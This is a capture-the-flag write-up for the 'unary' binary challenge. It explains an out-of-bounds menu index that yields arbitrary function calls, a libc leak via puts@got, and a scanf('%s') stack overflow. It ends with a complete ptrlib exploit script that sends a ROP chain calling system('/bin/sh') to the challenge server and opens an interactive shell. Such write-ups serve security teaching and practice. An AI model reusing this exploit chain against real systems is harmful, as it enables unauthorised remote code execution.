# [182pts] Unary (20 solves)
# Overview

Original Title: unary
File: libc-2.27.so, unary

We can apply an unary to our inputs.
```sh
$ ./unary 
0. EXIT
1. x++
2. x--
3. ~x
4. -x
Operator: 1
x = 123
f(x) = 124
```
PIE, SSP and RELRO are disabled.
```sh
$ checksec -f unary
RELRO / STACK CANARY / NX / PIE / RPATH / RUNPATH / Symbols / FORTIFY / Fortified / Fortifiable / FILE
Partial RELRO / No canary found / NX enabled / No PIE / No RPATH / No RUNPATH / 77 Symbols / Yes / 2 /  2 /  unary
```
# Plan
# Vulnerability
The vulnerability is very simple. It has Out-Of-Bound error on the menu index.
```sh
   0x0000000000400822 <+57>:    mov    %r14,%rdi
   0x0000000000400825 <+60>:    callq  0x40079e <read_int>
   0x000000000040082a <+65>:    sub    $0x1,%ebx
   0x000000000040082d <+68>:    movslq %ebx,%rbx
   0x0000000000400830 <+71>:    mov    %r13,%rsi
   0x0000000000400833 <+74>:    mov    %eax,%edi
   0x0000000000400835 <+76>:    callq  *(%r12,%rbx,8)
```
The first argument is our input, and the second argument (r13) is the pointer to a local variable to store the result.

The number that it gets as operator is in *rbx* and the number it gets as *x* is in *rdi*.
It uses *rbx* in order to call target function and the function first argument is in *rdi*.
Result will be stored on *rsi* which is equal to *r13*. (*r13* = *rsp* + *0xc*)
r12 is the base.(ope symbol)

```sh
(gdb) disass main
Dump of assembler code for function main:
   0x00000000004007e9 <+0>:	push   %r14
   0x00000000004007eb <+2>:	push   %r13
   0x00000000004007ed <+4>:	push   %r12
   0x00000000004007ef <+6>:	push   %rbp
   0x00000000004007f0 <+7>:	push   %rbx
   0x00000000004007f1 <+8>:	sub    $0x10,%rsp
   0x00000000004007f5 <+12>:	lea    0x120(%rip),%rbp        # 0x40091c
   0x00000000004007fc <+19>:	lea    0x124(%rip),%r14        # 0x400927
   0x0000000000400803 <+26>:	lea    0xc(%rsp),%r13
   0x0000000000400808 <+31>:	lea    0x2005f1(%rip),%r12        # 0x600e00 <ope>
   0x000000000040080f <+38>:	callq  0x400759 <show_menu>
   0x0000000000400814 <+43>:	mov    %rbp,%rdi
   0x0000000000400817 <+46>:	callq  0x40079e <read_int>
   0x000000000040081c <+51>:	mov    %eax,%ebx
   0x000000000040081e <+53>:	test   %eax,%eax
   0x0000000000400820 <+55>:	je     0x400855 <main+108>
   0x0000000000400822 <+57>:	mov    %r14,%rdi
   0x0000000000400825 <+60>:	callq  0x40079e <read_int>
   0x000000000040082a <+65>:	sub    $0x1,%ebx
   0x000000000040082d <+68>:	movslq %ebx,%rbx
   0x0000000000400830 <+71>:	mov    %r13,%rsi
   0x0000000000400833 <+74>:	mov    %eax,%edi
   0x0000000000400835 <+76>:	callq  *(%r12,%rbx,8)
   0x0000000000400839 <+80>:	mov    0xc(%rsp),%edx
   0x000000000040083d <+84>:	lea    0xe8(%rip),%rsi        # 0x40092c
   0x0000000000400844 <+91>:	mov    $0x1,%edi
   0x0000000000400849 <+96>:	mov    $0x0,%eax
   0x000000000040084e <+101>:	callq  0x4005f0 <__printf_chk@plt>
   0x0000000000400853 <+106>:	jmp    0x40080f <main+38>
   0x0000000000400855 <+108>:	mov    $0x0,%eax
   0x000000000040085a <+113>:	add    $0x10,%rsp
   0x000000000040085e <+117>:	pop    %rbx
   0x000000000040085f <+118>:	pop    %rbp
   0x0000000000400860 <+119>:	pop    %r12
   0x0000000000400862 <+121>:	pop    %r13
   0x0000000000400864 <+123>:	pop    %r14
   0x0000000000400866 <+125>:	retq   
End of assembler dump.
```
# Leaking libc base
We can easily leak the libc address since PIE is disabled.By passing the address of puts@got as the *x* and index of it as operator, puts@plt(puts@got); will be called. This leaks the pointer to the puts function.

# Getting the shell
How can we get the shell though?

My intended solution is use scanf in order to cause the Stack Overflow. Thanks to the read_int function, we have "%s" string in the binary. So, we can cause a simple stack overflow by calling scanf@plt with the address of %s set as the first argument.

Since the second argument is the pointer to a local buffer, this will cause

scanf("%s", &result);
which in turn causes a stack overflow. We can just write a simple rop chain to spawn the shell.
**reminder**:
call *scanf* in assembly use *rdi* as first arg to show type of variable (e.g. %s) and *rsi* to store scanned value.

# Exploit
```sh
from ptrlib import *
# from pwn import *


def call(index, arg):
	sock.sendlineafter(": ", str(index))
	sock.sendlineafter("= ", str(arg))
	return

def ofs(addr):
	"""compute index for this address function"""

	return (addr - elf.symbol('ope')) // 8 + 1

libc = ELF("./libc-2.27.so")
elf = ELF("./unary")



# sock = Process("./unary")
sock = Socket("66.172.27.144", 9004)


# libc leak
print("ofs and address of puts function {}  {}".format(ofs(elf.got('puts')), elf.got('puts')))
#now we call puts function with its address arguement ---> so it prints puts address
call(ofs(elf.got('puts')), elf.got('puts'))
#libc.symbol('puts') -> this is offset when base is zero
libc_base = u64(sock.recvline()) - libc.symbol('puts')# this base change every time we run script
logger.info("libc = " + hex(libc_base))

# r = ROP(libc)
# print(str(r.find_gadget(['ret'])))
# res was :Gadget(0x8aa, ['ret'], [], 0x8)
rop_ret = libc_base + 0x000008aa
# logger.info("ropret is " + str(rop_ret))

# r = ROP(libc)
# print(str(r.find_gadget(['pop rdi', 'ret'])))
# res was : Gadget(0x2155f, ['pop rdi', 'ret'], ['rdi'], 0x10)
rop_pop_rdi = libc_base + 0x0002155f

# prepare rop chain
ofs_scanf = ofs(elf.got('__isoc99_scanf'))
# print(next(elf.find("%s")))
# all data is in 400000 
ofs_format = 0x400000 + next(elf.find("%s"))
# af first rsp is =  0x7fffffffe208 and rsi=r13=rsp+c= 0x7fffffffe1dc so the difference is  2c = 44
payload  = b'A' * (4 + 0x28)
payload += p64(rop_ret)
payload += p64(rop_pop_rdi)
payload += p64(libc_base + next(libc.find("/bin/sh")))
payload += p64(libc_base + libc.symbol('system'))
call(ofs_scanf, ofs_format)
sock.sendline(payload)

# get the shell!
sock.sendlineafter(": ", "0")

sock.interactive()
```
**tip**
we use 44 'A' in ROP chain because if we get value of *rsp* at first of running using gdb, it is 0x7fffffffe208 and *rsi* when we call scanf, is equal to 0x7fffffffe1dc, so to get top of the stack we need 44 'A'.

I used [this](https://ptr-yudai.hatenablog.com/entry/2020/03/17/085604) write up and indeed I have added something to it.





